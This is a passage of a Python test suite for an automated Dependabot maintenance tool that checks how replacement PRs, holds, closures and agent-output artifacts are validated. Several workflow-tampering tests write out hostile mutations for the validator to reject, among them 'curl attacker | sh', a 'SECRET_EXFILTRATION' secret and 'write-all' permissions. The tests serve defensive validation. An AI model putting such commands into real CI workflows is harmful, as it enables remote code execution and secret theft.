        older = {"number": 100, "group": group["group"], "merged": True,
                 "sources": [copy.deepcopy(group["sources"][0])]}
        newer = {"number": 101, "group": group["group"], "merged": True,
                 "sources": [copy.deepcopy(group["sources"][1])]}
        action = native.next_action(group, [newer, older])
        self.assertEqual(action["replacement_pr"], newer["number"])
        self.assertEqual(action["source_prs"], newer["sources"])
        newer["sources"][0]["head_sha"] = "d" * 40
        action = native.next_action(group, [newer, older])
        self.assertEqual(action["replacement_pr"], older["number"])
        self.assertEqual(action["source_prs"], older["sources"])

    def test_cleanup_selection_precedes_newer_open_replacement_maintenance(self):
        group = {"group": "a" * 24, "blockers": [],
                 "sources": [{"number": 1, "head_sha": "b" * 40},
                             {"number": 2, "head_sha": "c" * 40}]}
        merged = {"number": 100, "group": group["group"], "merged": True,
                  "sources": [copy.deepcopy(group["sources"][0])]}
        opened = {"number": 101, "group": group["group"], "merged": False,
                  "blocked_holds": [], "sources": copy.deepcopy(group["sources"])}
        action = native.next_action(group, [merged, opened])
        self.assertEqual(action["action"], "close_superseded")
        self.assertEqual(action["replacement_pr"], merged["number"])
        self.assertEqual(action["source_prs"], merged["sources"])

    def test_cleanup_selection_preserves_group_and_open_replacement_blockers(self):
        group = {"group": "a" * 24, "blockers": [],
                 "sources": [{"number": 1, "head_sha": "b" * 40}]}
        merged = {"number": 100, "group": group["group"], "merged": True,
                  "sources": copy.deepcopy(group["sources"])}
        opened = {"number": 101, "group": group["group"], "merged": False,
                  "blocked_holds": ["human/unknown hold"], "sources": []}
        self.assertEqual(native.next_action(group, [merged, opened])["action"], "blocked")
        opened["blocked_holds"] = []
        ambiguous = {**opened, "number": 102}
        self.assertEqual(native.next_action(group, [merged, opened, ambiguous])["action"], "blocked")
        group["blockers"] = ["source has human/unknown hold"]
        self.assertEqual(native.next_action(group, [merged])["action"], "blocked")

    def test_ambiguous_open_replacements_fail_closed(self):
        group = {"group": "a" * 24, "blockers": [], "sources": []}
        replacements = [{"number": number, "group": group["group"], "merged": False,
                         "blocked_holds": [], "sources": []} for number in (100, 101)]
        self.assertEqual(native.next_action(group, replacements)["action"], "blocked")


    def test_inventory_accepts_unrelated_modified_dockerfile(self):
        self.source(2, "backend/Dockerfile", "FROM example.invalid/base:1.1\n")
        group = next(row for row in native.inventory(REPO)["groups"] if row["group"] is not None)
        self.assertEqual(group["blockers"], [])
        self.assertEqual(group["next_action"]["action"], "prepare_replacement")

    def test_inventory_blocks_ambiguous_native_sibling_despite_docker_title(self):
        self.source(2, "api/Makefile", "models:\n\t@echo changed\n")
        self.pulls[2]["title"] = "chore(deps): bump Docker base image"
        result = native.inventory(REPO)
        group = next(row for row in result["groups"] if row["group"] is not None)
        self.assertEqual([row["number"] for row in group["sources"]], [1])
        self.assertEqual(group["next_action"]["action"], "blocked")
        self.assertIn("PR #2: unsupported/protected native source path: api/Makefile",
                      group["next_action"]["reason"])

    def test_inventory_requires_complete_disjoint_sibling_file_evidence(self):
        self.source(2, "backend/Dockerfile", "FROM example.invalid/base:1.1\n")
        original = self.api
        def partial(endpoint, **kwargs):
            if "/pulls/2/files?" in endpoint:
                return [[]]
            return original(endpoint, **kwargs)
        with mock_api(side_effect=partial):
            result = native.inventory(REPO)
        group = next(row for row in result["groups"] if row["group"] is not None)
        self.assertEqual(group["next_action"]["action"], "blocked")
        self.assertIn("PR #2: incomplete changed-file evidence", group["next_action"]["reason"])


    def test_same_family_identity_survives_new_target_and_source_revision(self):
        original = native.source_intent(REPO, native.snapshot(REPO, 1, self.detail(1)["head"]["sha"]))
        git(self.seed, "switch", self.pulls[1]["head"]["ref"])
        self.write("backend/go.mod", manifest("v1.2.0"))
        git(self.seed, "add", ".")
        git(self.seed, "commit", "-m", "new upstream target")
        git(self.seed, "push", "origin", self.pulls[1]["head"]["ref"])
        git(self.seed, "switch", "main")
        updated = native.source_intent(REPO, native.snapshot(REPO, 1, self.detail(1)["head"]["sha"]))
        self.assertEqual(updated["group"], original["group"])
        self.assertNotEqual(updated["target"], original["target"])


    def next_family_upgrade(self):
        first = self.replacement_fixture()
        self.merge_replacement(first["number"])
        self.write("main-only.txt", "unrelated intervening trusted main change\n")
        git(self.seed, "add", ".")
        git(self.seed, "commit", "-m", "main advances after family merge")
        git(self.seed, "push", "origin", "main")
        self.base = git(self.seed, "rev-parse", "HEAD")
        target = "v1.2.0"
        sha = self.source(2, "backend/go.mod", manifest(target))
        self.write("backend/go.mod", manifest(target))
        self.write("internal/go.mod", manifest(target))
        for prefix in native.VENDORS:
            self.write(prefix + "modules.txt", f"# {PACKAGE} {target}\n## explicit; go 1.26.0\n{PACKAGE}\n")
        request = {"source_prs": [{"number": 2, "head_sha": sha}],
                   "expected_base_sha": self.base, "patch": git(self.seed, "diff") + "\n",
                   "title": "chore(deps): next library release", "body": "Regenerated next native dependency upgrade."}
        git(self.seed, "restore", ".")
        return first, request

    def test_target_selection_distinguishes_merged_cleanup_from_new_candidate(self):
        first, request = self.next_family_upgrade()
        observed = native.inventory(REPO)
        groups = {group["target"]: group for group in observed["groups"]}
        self.assertEqual(set(groups), {NEW, "v1.2.0"})
        old, candidate = groups[NEW], groups["v1.2.0"]
        self.assertEqual(old["group"], candidate["group"])
        self.assertEqual(old["next_action"]["action"], "close_superseded")
        self.assertEqual(old["next_action"]["source_prs"], native.metadata(self.pulls[first["number"]]["body"])["sources"])
        self.assertEqual(candidate["next_action"]["action"], "prepare_replacement")
        inputs = self.prepare_inputs(observed)
        git(self.seed, "apply", "-", input=request["patch"])
        prepare_request(REPO, *inputs, self.root / "candidate", target=candidate["target"], cwd=self.seed)
        prepared = json.loads((self.root / "candidate" / native.REQUEST_FILE).read_text())
        self.assertEqual(prepared["source_prs"], request["source_prs"])
        for target in (NEW, "v9.0.0"):
            with self.subTest(target=target), self.assertRaises(ValueError):
                prepare_request(REPO, *inputs, self.root / "rejected", target=target, cwd=self.seed)
        self.assertFalse((self.root / "rejected").exists())
        git(self.seed, "restore", ".")
        with self.assertRaisesRegex(ValueError, "exact native source"):
            native.reconcile(REPO, self.action("close-superseded", number=2, replacement_pr=first["number"]))
        self.assertEqual(self.comments[2], [])

    def test_foreign_fork_author_or_human_hold_blocks_admission(self):
        original = copy.deepcopy(self.pulls[1])
        changes = [("user", {"login": "human", "type": "User"}),
                   ("head", {**original["head"], "repo": {"full_name": "foreign/fork"}})]
        for key, value in changes:
            self.pulls[1] = {**copy.deepcopy(original), key: value}
            with self.subTest(key=key), self.assertRaises(ValueError):
                native.reconcile(REPO, self.action("admit"))
        self.pulls[1] = original
        self.hold(author="human", body="/hold awaiting manual review")
        with self.assertRaisesRegex(ValueError, "human/unknown"):
            native.reconcile(REPO, self.action("admit"))
        self.assertEqual(len(self.comments[1]), 1)


    def test_safe_native_admission_is_fixed_command_and_idempotent(self):
        old = (self.seed / ".github/workflows/ci.yml").read_text()
        self.source(2, ".github/workflows/ci.yml", old.replace("b" * 40, PIN))
        first = native.reconcile(REPO, self.action("admit", number=2))
        second = native.reconcile(REPO, self.action("admit", number=2))
        self.assertEqual(first["status"], "requested")
        self.assertEqual(second["status"], "already-admitted")
        self.assertEqual(len(self.comments[2]), 1)
        self.assertEqual(self.comments[2][0]["body"].splitlines()[-1], "/ok-to-test")

    def test_manifest_only_go_and_npm_native_prs_need_replacement_not_admission(self):
        with self.assertRaisesRegex(ValueError, "workspace/vendor"):
            native.reconcile(REPO, self.action("admit"))
        before = (self.seed / "api/package.json").read_text()
        self.source(2, "api/package.json", before.replace("3.9.9", "3.9.10"))
        with self.assertRaisesRegex(ValueError, "updated lock"):
            native.reconcile(REPO, self.action("admit", number=2))
        self.assertEqual(self.comments[1], [])
        self.assertEqual(self.comments[2], [])

    def test_retry_requires_causal_evidence_and_is_bounded_per_head(self):
        self.hold()
        self.ci()
        evidence = "Resolved transient infrastructure issue; failed https://prow.ci.openshift.org/view/failed now succeeds in https://prow.ci.openshift.org/view/comparison."
        with self.assertRaises(ValueError):
            native.reconcile(REPO, self.action("recover-retry", evidence="try again"))
        result = native.reconcile(REPO, self.action("recover-retry", evidence=evidence))
        self.assertEqual(result["status"], "requested")
        self.assertTrue(self.comments[1][-1]["body"].endswith("/hold cancel\n/retest-required"))
        with self.assertRaises(ValueError):
            native.reconcile(REPO, self.action("recover-retry", evidence=evidence))
        self.assertEqual(len(self.comments[1]), 2)

    def test_pending_ci_and_unexplained_hold_preserve_retry_budget(self):
        self.hold()
        self.ci(pending=True)
        evidence = "Resolved transient infrastructure failure https://prow.ci.openshift.org/view/failed; comparison https://prow.ci.openshift.org/view/comparison."
        with self.assertRaisesRegex(ValueError, "pending"):
            native.reconcile(REPO, self.action("recover-retry", evidence=evidence))
        self.assertEqual(len(self.comments[1]), 1)
        self.comments[1][0]["body"] = "/hold unexplained"
        self.policy[self.detail(1)["head"]["sha"]]["active_holds"][0]["kind"] = "unexplained"
        self.ci(green=True)
        with self.assertRaisesRegex(ValueError, "human/unknown"):
            native.reconcile(REPO, self.action("release-hold"))

    def test_green_release_and_robot_replacement_recovery_use_distinct_identity(self):
        result = self.replacement_fixture()
        self.hold(number=result["number"])
        self.ci(number=result["number"], green=True)
        native.reconcile(REPO, self.action("release-hold", number=result["number"]))
        self.assertEqual(self.comments[result["number"]][-1]["body"], "/hold cancel")
        self.assertEqual(native.replacement(self.detail(result["number"]), REPO)["group"], result["group"])
        with self.assertRaises(ValueError):
            native.reconcile(REPO, self.action("admit", number=result["number"]))

    def test_unmerged_replacement_never_closes_native_source(self):
        result = self.replacement_fixture()
        with self.assertRaises(ValueError):
            native.reconcile(REPO, self.action("close-superseded", replacement_pr=result["number"]))
        self.assertEqual(self.comments[1], [])

    def test_requested_closure_waits_without_starving_independent_family(self):
        self.source(2, "api/package.json", json.dumps({
            "devDependencies": {"prettier": "3.9.10"}, "overrides": {"undici": "7.30.1"}}))
        result = self.replacement_fixture()
        self.merge_replacement(result["number"])
        request = self.action("close-superseded", replacement_pr=result["number"])
        native.reconcile(REPO, request)
        inventory = native.inventory(REPO)
        go = next(group for group in inventory["groups"] if group.get("ecosystem") == "go")
        npm = next(group for group in inventory["groups"] if group.get("ecosystem") == "npm")
        self.assertEqual(go["next_action"]["action"], "wait_for_closure")
        self.assertEqual(go["sources"][0]["closure_requests"], [result["number"]])
        self.assertEqual(npm["next_action"]["action"], "prepare_replacement")
        self.assertEqual(native.reconcile(REPO, request)["status"], "close-already-requested")
        self.pulls[1]["state"] = "closed"
        observed = native.inventory(REPO)
        self.assertEqual([source["number"] for group in observed["groups"] for source in group["sources"]], [2])

    def test_pending_closure_does_not_hide_another_mapped_source(self):
        sources = [{"number": 1, "head_sha": "b" * 40, "closure_requests": [100]},
                   {"number": 2, "head_sha": "c" * 40, "closure_requests": []}]
        group = {"group": "a" * 24, "blockers": [], "sources": sources}
        merged = {"number": 100, "group": group["group"], "merged": True,
                  "sources": [{"number": source["number"], "head_sha": source["head_sha"]}
                              for source in sources]}
        decision = native.next_action(group, [merged])
        self.assertEqual(decision["action"], "close_superseded")
        self.assertEqual(decision["source_prs"], [{"number": 2, "head_sha": "c" * 40}])
        sources[0]["closure_requests"] = [999]
        self.assertEqual(native.next_action(group, [merged])["source_prs"], merged["sources"])

    def test_closure_requests_require_trusted_current_head_command(self):
        sha = "b" * 40
        body = f"<!-- {native.MARKER}close:{sha}:100 -->\nCovered by a merged replacement.\n\n/close"
        snap = {"pull": {"head": {"sha": sha}}, "comments": []}
        cases = [(native.ROBOT, body, [100]), ("human", body, []),
                 (native.ROBOT, body.replace(sha, "c" * 40), []),
                 (native.ROBOT, "Example:\n" + body, []),
                 (native.ROBOT, body.replace("/close", "No closure requested."), []),
                 (native.ROBOT, body + "\n```", [])]
        for author, text, expected in cases:
            with self.subTest(author=author, body=text):
                snap["comments"] = [{"user": {"login": author}, "body": text}]
                self.assertEqual(native.closure_requests(snap), expected)

    def test_merged_coverage_closes_only_via_prow_command_and_inventory_finds_merge(self):
        result = self.replacement_fixture()
        self.merge_replacement(result["number"])
        inventory = native.inventory(REPO)
        self.assertTrue(inventory["replacements"][0]["merged"])
        self.assertEqual(inventory["groups"][0]["next_action"]["action"], "close_superseded")
        self.assertEqual(inventory["groups"][0]["next_action"]["replacement_pr"], result["number"])
        native.reconcile(REPO, self.action("close-superseded", replacement_pr=result["number"]))
        self.assertTrue(self.comments[1][-1]["body"].endswith("\n/close"))
        self.assertEqual(self.pulls[1]["state"], "open")
        self.assertFalse(any(method == "PATCH" and data.get("state") == "closed"
                             for _, method, data in self.calls if isinstance(data, dict)))

    def test_merged_marker_and_shared_manifest_are_not_coverage(self):
        result = self.replacement_fixture()
        self.merge_replacement(result["number"])
        self.write("backend/go.mod", manifest(OLD))
        git(self.seed, "add", ".")
        git(self.seed, "commit", "-m", "revert actual dependency")
        git(self.seed, "push", "origin", "main")
        with self.assertRaisesRegex(ValueError, "not covered"):
            native.reconcile(REPO, self.action("close-superseded", replacement_pr=result["number"]))
        self.assertEqual(self.comments[1], [])

    def test_partial_api_history_and_api_errors_are_not_empty_inventory(self):
        original = self.api
        def partial(endpoint, **kwargs):
            if "/pulls/1/commits?" in endpoint:
                return [[]]
            return original(endpoint, **kwargs)
        with mock_api(side_effect=partial):
            result = native.inventory(REPO)
            self.assertTrue(result["groups"][0]["blockers"])
            with self.assertRaisesRegex(ValueError, "commit evidence"):
                native.reconcile(REPO, self.action("admit"))
        with mock_api(side_effect=subprocess.CalledProcessError(1, ["gh", "api"])):
            with self.assertRaises(subprocess.CalledProcessError):
                native.inventory(REPO)



class SnapshotEvidenceTests(unittest.TestCase):
    def test_depctl_receives_complete_snapshot_and_returns_shared_policy(self):
        sha = "a" * 40
        comments = [{"id": 1, "body": "/hold"}]
        events = [{"id": 2, "event": "labeled"}]
        statuses = [{"id": 3, "context": "ci/pipeline-gate"}]
        checks = [{"id": 4, "name": "check", "head_sha": sha}]
        expected = {"active_holds": [{"kind": "unexplained"}], "cancellation_pending": False,
                    "trusted_hold_label": False, "ci": {"positive": [], "blocked": []}}
        for binary in (None, "/trusted/bin/depctl"):
            with self.subTest(binary=binary), patch.dict(os.environ, {}, clear=True):
                if binary:
                    os.environ["DEPCTL_BINARY"] = binary
                with patch.object(native.subprocess, "run", return_value=subprocess.CompletedProcess(
                        [], 0, json.dumps(expected), "")) as run:
                    result = native.snapshot_evidence(comments, [sha], events, statuses, checks, sha)
                self.assertEqual(result, expected)
                args, kwargs = run.call_args
                self.assertEqual(args[0], [binary or "depctl", "maintenance", "snapshot-evidence"])
                self.assertEqual(json.loads(kwargs["input"]), {
                    "comments": comments, "commits": [sha], "hold_events": events,
                    "statuses": statuses, "checks": checks, "head": sha})
                self.assertTrue(kwargs["check"])
                self.assertTrue(kwargs["capture_output"])
                self.assertTrue(kwargs["text"])

    def test_shared_policy_errors_fail_closed(self):
        error = subprocess.CalledProcessError(1, ["depctl", "maintenance", "snapshot-evidence"])
        with patch.object(native.subprocess, "run", side_effect=error), self.assertRaises(subprocess.CalledProcessError):
            native.snapshot_evidence([], ["a" * 40], [], [], [], "a" * 40)
        with patch.object(native.subprocess, "run", return_value=subprocess.CompletedProcess(
                [], 0, "not-json", "")), self.assertRaises(ValueError):
            native.snapshot_evidence([], ["a" * 40], [], [], [], "a" * 40)


class RequestTransportTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name)
        self.request = {
            "source_prs": [{"number": 1, "head_sha": "a" * 40}],
            "expected_base_sha": "b" * 40,
            "patch": ('diff --git a/api/package.json b/api/package.json\n'
                      '--- a/api/package.json\n+++ b/api/package.json\n@@ -1 +1 @@\n'
                      '-{"@scope/package":"1.0.0"}\n+{"@scope/package":"1.1.0"}\n'),
            "title": "chore(deps): update @scope/package",
            "body": "Upgrade @scope/package.\nPreserve café and Unicode: 🦉.\n"}
        api_context = mock_api(side_effect=AssertionError("transport must not use the API"))
        api_context.__enter__()
        self.addCleanup(api_context.__exit__, None, None, None)

    def test_flattened_and_nested_digest_envelopes_preserve_entire_request(self):
        for nested in (False, True):
            with self.subTest(nested=nested):
                output = replacement_output(self.root, self.request, nested=nested)
                self.assertEqual(native.read_request(output, "native_replacement"), self.request)
        output.write_text('{"items":[]}')
        self.assertIsNone(native.read_request(output, "native_replacement"))

    def prepared_detection(self, output, name="detection"):
        directory = self.root / name
        directory.mkdir()
        (directory / "agent_output.json").write_bytes(output.read_bytes())
        return directory

    def test_detection_expands_flattened_and_nested_items_without_changing_digest_or_other_items(self):
        for nested in (False, True):
            with self.subTest(nested=nested):
                output = replacement_output(self.root, self.request, nested=nested)
                document = json.loads(output.read_text())
                other = {"type": "noop", "message": "Other safe output remains present."}
                document["items"].insert(0, other)
                output.write_text(json.dumps(document))
                original = output.read_bytes()
                artifact = self.root / "agent" / native.REQUEST_FILE
                payload = artifact.read_bytes()
                detection = self.prepared_detection(output, f"detection-{nested}")
                native.stage_detection(REPO, output, detection)
                scanned = json.loads((detection / "agent_output.json").read_text())
                self.assertEqual(scanned["items"][0], other)
                expanded = scanned["items"][1]
                original_item = document["items"][1]
                self.assertEqual({key: expanded[key] for key in original_item}, original_item)
                self.assertEqual(set(expanded) - set(original_item),
                                 {"title", "body", "source_prs", "expected_base_sha"})
                self.assertEqual(expanded["title"], self.request["title"].replace("@", "\uff20"))
                self.assertEqual(expanded["body"], self.request["body"].replace("@", "\uff20"))
                self.assertEqual((detection / native.DETECTION_PATCH).read_bytes(),
                                 self.request["patch"].encode("utf-8"))
                self.assertEqual(output.read_bytes(), original)
                self.assertEqual(artifact.read_bytes(), payload)
                self.assertEqual(native.read_request(output, "native_replacement"), self.request)

    def test_detection_no_request_leaves_prepared_files_unchanged(self):
        output = self.root / "agent_output.json"
        output.write_text('{"items":[{"type":"noop","message":"No replacement"}]}')
        detection = self.prepared_detection(output)
        ordinary_patch = detection / "aw-ordinary.patch"
        ordinary_patch.write_text("Ordinary detector input\n")
        before = {path.name: path.read_bytes() for path in detection.iterdir()}
        with patch("sys.stdout", new_callable=io.StringIO) as stdout:
            self.assertEqual(native.main(["stage-detection", REPO, str(output), str(detection)]), 0)
        self.assertEqual(json.loads(stdout.getvalue()), {"status": "no-request"})
        self.assertEqual({path.name: path.read_bytes() for path in detection.iterdir()}, before)
        self.assertEqual(output.read_bytes(), before["agent_output.json"])

    def test_detection_rejects_missing_tampered_or_invalid_artifact_before_staging(self):
        for failure in ("missing", "tampered", "schema", "commands", "marker"):
            with self.subTest(failure=failure):
                request = copy.deepcopy(self.request)
                if failure == "schema":
                    del request["title"]
                elif failure == "commands":
                    request["body"] = "Evidence\n/retest"
                elif failure == "marker":
                    request["body"] = "<!-- " + native.MARKER + "spoof -->"
                output = replacement_output(self.root / failure, request)
                artifact = output.parent / "agent" / native.REQUEST_FILE
                if failure == "missing":
                    artifact.unlink()
                elif failure == "tampered":
                    artifact.write_bytes(artifact.read_bytes() + b"\n")
                detection = self.prepared_detection(output, f"detection-{failure}")
                (detection / "aw-ordinary.patch").write_text("Existing detector input\n")
                before = {path.name: path.read_bytes() for path in detection.iterdir()}
                original = output.read_bytes()
                payload = artifact.read_bytes() if artifact.exists() else None
                with patch("sys.stderr", new_callable=io.StringIO) as stderr, \
                        patch("sys.stdout", new_callable=io.StringIO) as stdout:
                    self.assertEqual(native.main(["stage-detection", REPO, str(output), str(detection)]), 1)
                self.assertIn("native Dependabot maintenance blocked:", stderr.getvalue())
                self.assertEqual(stdout.getvalue(), "")
                self.assertEqual({path.name: path.read_bytes() for path in detection.iterdir()}, before)
                self.assertEqual(output.read_bytes(), original)
                self.assertEqual(artifact.read_bytes() if artifact.exists() else None, payload)

    def test_detection_requires_matching_separate_prepared_output_and_never_overwrites_patch(self):
        output = replacement_output(self.root, self.request)
        original = output.read_bytes()
        with self.assertRaisesRegex(ValueError, "separate copy"):
            native.stage_detection(REPO, output, output.parent)
        self.assertEqual(output.read_bytes(), original)
        self.assertFalse((output.parent / native.DETECTION_PATCH).exists())
        detection = self.prepared_detection(output)
        detector_output = detection / "agent_output.json"
        detector_output.write_text('{"items":[]}')
        with self.assertRaisesRegex(ValueError, "does not match"):
            native.stage_detection(REPO, output, detection)
        self.assertEqual(detector_output.read_text(), '{"items":[]}')
        self.assertFalse((detection / native.DETECTION_PATCH).exists())
        detector_output.write_bytes(original)
        outside = self.root / "outside.patch"
        outside.write_text("Must not overwrite outside detection directory\n")
        (detection / native.DETECTION_PATCH).symlink_to(outside)
        with self.assertRaises(OSError):
            native.stage_detection(REPO, output, detection)
        self.assertEqual(detector_output.read_bytes(), original)
        self.assertEqual(outside.read_text(), "Must not overwrite outside detection directory\n")
        self.assertEqual(output.read_bytes(), original)

    def test_legacy_ambiguous_or_path_selected_envelopes_are_rejected(self):
        output = replacement_output(self.root, self.request)
        digest = json.loads(output.read_text())["items"][0]["request_sha256"]
        for item in (
                {"type": "native_replacement", "request": json.dumps(self.request)},
                {"type": "native_replacement", "request_b64": base64.b64encode(json.dumps(self.request).encode()).decode()},
                {"type": "native_replacement", "request_sha256": digest, "path": "alternate.json"},
                {"type": "native_replacement", "data": {"request_sha256": digest, "request": "{}"}},
                {"type": "native_replacement", "data": {"request_sha256": digest}, "request_sha256": digest}):
            output.write_text(json.dumps({"items": [item]}))
            with self.subTest(item=item), self.assertRaises(ValueError):
                native.read_request(output, "native_replacement")

    def test_malformed_digest_types_lengths_and_alphabets_fail_closed(self):
        output = replacement_output(self.root, self.request)
        for digest in (None, True, 1, [], {}, "", "a" * 63, "a" * 65, "A" * 64, "g" * 64, "a" * 64 + "\n"):
            output.write_text(json.dumps({"items": [{"type": "native_replacement", "request_sha256": digest}]}))
            with self.subTest(digest=digest), self.assertRaises(ValueError):
                native.read_request(output, "native_replacement")

    def test_artifact_must_match_digest_and_be_available_at_only_fixed_path(self):
        output = replacement_output(self.root, self.request)
        artifact = self.root / "agent" / native.REQUEST_FILE
        valid = artifact.read_bytes()
        artifact.write_bytes(valid + b"\n")
        with self.assertRaisesRegex(ValueError, "digest mismatch"):
            native.read_request(output, "native_replacement")
        artifact.unlink()
        (self.root / native.REQUEST_FILE).write_bytes(valid)
        with self.assertRaises(OSError):
            native.read_request(output, "native_replacement")

    def test_symlink_payload_and_agent_directory_are_rejected(self):
        output = replacement_output(self.root, self.request)
        artifact = self.root / "agent" / native.REQUEST_FILE
        outside = self.root / "outside.json"
        outside.write_bytes(artifact.read_bytes())
        artifact.unlink()
        artifact.symlink_to(outside)
        with self.assertRaises(OSError):
            native.read_request(output, "native_replacement")
        artifact.unlink()
        artifact.write_bytes(outside.read_bytes())
        directory = self.root / "agent"
        moved = self.root / "other"
        directory.rename(moved)
        directory.symlink_to(moved, target_is_directory=True)
        with self.assertRaises(OSError):
            native.read_request(output, "native_replacement")

    def test_empty_oversized_and_nonregular_artifacts_are_rejected_before_decoding(self):
        output = replacement_output(self.root, self.request)
        artifact = self.root / "agent" / native.REQUEST_FILE
        for size in (0, native.MAX_REQUEST + 1):
            with artifact.open("wb") as payload:
                payload.truncate(size)
            with self.subTest(size=size), self.assertRaisesRegex(ValueError, "bounded regular file"):
                native.read_request(output, "native_replacement")
        artifact.unlink()
        artifact.mkdir()
        with self.assertRaises((ValueError, OSError)):
            native.read_request(output, "native_replacement")

    def test_invalid_utf8_json_duplicate_fields_and_deep_nesting_are_rejected(self):
        valid = json.dumps(self.request, ensure_ascii=False).encode("utf-8")
        duplicates = valid[:-1] + b', "title": "chore(deps): overwritten"}'
        for payload in (b"\xff", b"{invalid", b"null", b"[]", duplicates, b"[" * 2000 + b"]" * 2000,
                        valid.replace("café".encode(), b"caf\\ud800")):
            output = replacement_output(self.root, payload=payload)
            with self.subTest(payload=payload[:50]), self.assertRaises(ValueError):
                native.read_request(output, "native_replacement")

    def test_maximum_patch_plus_full_multibyte_metadata_survives_artifact_transport(self):
        prefix = "diff --git a/api/package.json b/api/package.json\n--- a/api/package.json\n+++ b/api/package.json\n@@ -1 +1 @@\n-old\n+"
        self.request["patch"] = prefix + "x" * (native.MAX_PATCH - len(prefix.encode()) - 1) + "\n"
        self.request["title"] = "chore(deps): " + "é" * (200 - len("chore(deps): "))
        self.request["body"] = "🦉" * 20000
        output = replacement_output(self.root, self.request)
        self.assertGreater((self.root / "agent" / native.REQUEST_FILE).stat().st_size, native.MAX_PATCH)
        self.assertEqual(native.read_request(output, "native_replacement"), self.request)
        self.request["patch"] += "x"
        output = replacement_output(self.root, self.request)
        with self.assertRaisesRegex(ValueError, "at most 16 MiB"):
            native.read_request(output, "native_replacement")


class EvidenceTests(unittest.TestCase):
    def test_output_accepts_actual_flattened_and_nested_envelopes_but_not_ambiguity(self):
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "output.json"
            for envelope in ({"type": "native_action", "request": '{"action":"admit"}'},
                             {"type": "native_action", "data": {"request": '{"action":"admit"}'}}):
                path.write_text(json.dumps({"items": [envelope]}))
                self.assertEqual(native.read_request(path, "native_action"), {"action": "admit"})
            for output in ({}, {"items": [{"request": "{}"}]},
                           {"items": [{"type": "native_action", "request": "{}"}] * 2},
                           {"items": [{"type": "native_action", "request": {}, "extra": "ignored?"}]},
                           {"items": [], "errors": ["agent error"]},
                           {"items": [], "errors": {}},
                           {"items": [{"type": "native_action", "request": "{}"},
                                      {"type": "native_replacement", "request_sha256": "a" * 64}]}):
                path.write_text(json.dumps(output))
                with self.subTest(output=output), self.assertRaises(ValueError):
                    native.read_request(path, "native_action")

    def test_action_pin_change_is_allowed_but_commands_permissions_and_ref_injection_are_not(self):
        old = "permissions: read-all\nsteps:\n  - uses: github/codeql-action/init@" + "b" * 40 + " # v4.0.0\n  - run: echo safe\n"
        new = old.replace("b" * 40, PIN).replace("# v4.0.0", "# stale-comment")
        result = native.changes(".github/workflows/codeql.yml", old, new)
        self.assertEqual(result[0]["target"], PIN)
        self.assertEqual(native.upgrade_family("actions", result[0]["package"]), "github/codeql-action")
        for unsafe in (new.replace("read-all", "write-all"), new.replace("echo safe", "curl attacker | sh"),
                       new.replace("@" + PIN, "@v4"), new.replace("github/codeql-action", "attacker/codeql-action")):
            with self.subTest(unsafe=unsafe), self.assertRaises(ValueError):
                native.changes(".github/workflows/codeql.yml", old, unsafe)

    def test_compiled_action_metadata_and_hash_deltas_preserve_executable_body(self):
        def compiled(pin, digest, version="v1.0.0"):
            metadata = {"schema_version": "v4", "frontmatter_hash": digest * 64, "body_hash": "c" * 64,
                        "compiler_version": "v1.0.1", "strict": True, "agent_id": "copilot"}
            manifest_data = {"version": 1, "secrets": ["GITHUB_TOKEN"],
                             "actions": [{"repo": "actions/checkout", "sha": pin, "version": version}]}
            return ("# gh-aw-metadata: " + json.dumps(metadata) + "\n# gh-aw-manifest: " + json.dumps(manifest_data)
                    + "\npermissions: read-all\non: push\njobs:\n  test:\n    steps:\n      - uses: actions/checkout@" + pin
                    + "\n      - run: echo safe\n")
        before, after = compiled("b" * 40, "d"), compiled(PIN, "e", "v2.0.0")
        with mock_api(return_value={"sha": PIN}):
            entries = native.changes(".github/workflows/example.lock.yml", before, after)
            self.assertEqual(entries[0]["target"], PIN)
            for unsafe in (after.replace("read-all", "write-all"), after.replace("echo safe", "echo unsafe"),
                           after.replace("on: push", "on: pull_request_target"),
                           after.replace('"compiler_version": "v1.0.1"', '"compiler_version": "v9.0.0"'),
                           after.replace('"GITHUB_TOKEN"', '"SECRET_EXFILTRATION"')):
                with self.subTest(unsafe=unsafe), self.assertRaises(ValueError):
                    native.changes(".github/workflows/example.lock.yml", before, unsafe)


    def test_official_action_commit_requires_release_tag_not_network_visibility(self):
        with mock_api(return_value=[[{"name": "v2.0.0", "commit": {"sha": PIN}}]]):
            native.official_action_pin("actions/checkout", PIN)
            with self.assertRaisesRegex(ValueError, "release-tag"):
                native.official_action_pin("actions/checkout", "f" * 40)
        with mock_api(return_value=[[{"name": "development", "commit": {"sha": PIN}}]]):
            with self.assertRaises(ValueError):
                native.official_action_pin("actions/checkout", PIN)

    def test_large_immutable_content_uses_exact_blob_fallback(self):
        value = b"complete generated document\n"
        blob = "d" * 40
        replies = [{"type": "file", "encoding": "none", "sha": blob, "size": len(value)},
                   {"encoding": "base64", "sha": blob, "size": len(value), "content": base64.b64encode(value).decode()}]
        with mock_api(side_effect=replies) as api:
            self.assertEqual(native.content(REPO, PIN, "api/package-lock.json"), value.decode())
            self.assertEqual(api.call_args_list[1].args[0], f"repos/{REPO}/git/blobs/{blob}")

    def test_go_cascade_keeps_direct_family_and_all_indirect_intent(self):
        before = manifest(OLD)
        after = manifest(NEW).replace(")\n", "\tother.example/indirect v2.0.0 // indirect\n)\n")
        entries = native.changes("backend/go.mod", before, after, cascade=True)
        self.assertEqual({row["package"] for row in entries if row["direct"]}, {PACKAGE})
        native.verify_coverage(entries, lambda path: after, {"backend/go.mod"})
        with self.assertRaises(ValueError):
            native.verify_coverage(entries, lambda path: manifest(NEW), {"backend/go.mod"})
        with self.assertRaises(ValueError):
            native.changes("backend/go.mod", before, after.replace("go 1.26.0", "go 1.27.0"), cascade=True)

    def test_npm_security_override_and_scripts_cannot_be_removed_as_regeneration(self):
        before = json.dumps({"devDependencies": {"prettier": "3.9.9"}, "overrides": {"undici": "7.30.1"}, "scripts": {"build": "safe"}})
        after = before.replace("3.9.9", "3.9.10")
        self.assertEqual(native.changes("api/package.json", before, after)[0]["target"], "3.9.10")
        for unsafe in (after.replace('"undici": "7.30.1"', ''), after.replace('"build": "safe"', '"build": "unsafe"')):
            with self.assertRaises(ValueError):
                native.changes("api/package.json", before, unsafe)

    def test_nested_security_overrides_survive_unrelated_native_npm_update(self):
        document = {"devDependencies": {"prettier": "3.9.9"},
